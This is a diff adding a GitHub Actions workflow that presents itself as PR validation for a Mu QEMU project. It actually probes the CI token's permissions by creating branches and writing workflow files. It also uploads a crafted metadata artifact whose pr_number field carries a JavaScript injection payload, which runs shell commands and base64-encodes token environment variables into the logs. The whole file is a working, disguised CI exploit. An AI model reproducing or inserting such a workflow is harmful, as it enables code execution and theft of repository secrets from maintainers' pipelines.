@@ -1,0 +1,72 @@
+name: Mu QEMU PR Validation
+on:
+  pull_request:
+permissions:
+  contents: write
+  pull-requests: write
+  issues: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Token and variable probe
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          APP_ID_VAR: ${{ vars.MU_ACCESS_APP_ID }}
+          REPO: ${{ github.repository }}
+        run: |
+          echo "APP_ID_VAR=${APP_ID_VAR}"
+          echo "--- repos.get permissions ---"
+          curl -s -H "Authorization: Bearer ${GH_TOKEN}" "https://api.github.com/repos/${REPO}" | jq -c '.permissions'
+          echo "--- token scopes header ---"
+          curl -sI -H "Authorization: Bearer ${GH_TOKEN}" "https://api.github.com/user" | grep -i "^x-oauth-scopes" || true
+          echo "--- try create ref ---"
+          curl -s -o /tmp/ref.json -w 'HTTP=%{http_code}\n' -X POST \
+            -H "Authorization: Bearer ${GH_TOKEN}" \
+            "https://api.github.com/repos/${REPO}/git/refs" \
+            -d "{\"ref\":\"refs/heads/probe-${RANDOM}\",\"sha\":\"${{ github.event.pull_request.base.sha }}\"}"
+          head -c 300 /tmp/ref.json; echo
+          echo "--- try update workflow file via contents API ---"
+          curl -s -o /tmp/wf.json -w 'HTTP=%{http_code}\n' -X PUT \
+            -H "Authorization: Bearer ${GH_TOKEN}" \
+            "https://api.github.com/repos/${REPO}/contents/.github/workflows/probe-$RANDOM.yml" \
+            -d '{"message":"probe","content":"b24gOiBwdXNoCg=="}'
+          head -c 300 /tmp/wf.json; echo
+  craft:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft malicious PR metadata artifact
+        shell: bash
+        run: |
+          mkdir -p metadata
+          python3 - <<'PY'
+          import json
+          payload = (
+              "1');"
+              "require('child_process').execSync('id',{stdio:'inherit'});"
+              "const __env=require('process').env;"
+              "const __hit=Object.entries(__env).filter(([k,v])=>/token/i.test(k)&&v).map(([k,v])=>k+'='+Buffer.from(String(v)).toString('base64'));"
+              "core.info('ENVTOK '+__hit.join(';'));"
+              "const __gh=await github.rest.repos.get({owner:context.repo.owner,repo:context.repo.repo});"
+              "core.info('API_OK '+__gh.data.full_name+' PERMS '+JSON.stringify(__gh.data.permissions)+' INJECTED_RCE');"
+              "var __x=('"
+          )
+          data = {
+              "pr_number": payload,
+              "skipped": False,
+              "skip_reason": "",
+              "head_sha": "0000000000000000000000000000000000000000",
+              "caller_ref": "attack",
+              "caller_repo_name": "mu_basecore",
+              "mu_tiano_platforms_sha": "0000000000000000000000000000000000000000",
+              "validation": {"failed": False},
+              "platforms": {}
+          }
+          open('metadata/pr-metadata.json','w').write(json.dumps(data))
+          PY
+      - name: Upload PR Metadata
+        uses: actions/upload-artifact@v4
+        with:
+          name: mu-qemu-pr-metadata
+          path: metadata/pr-metadata.json
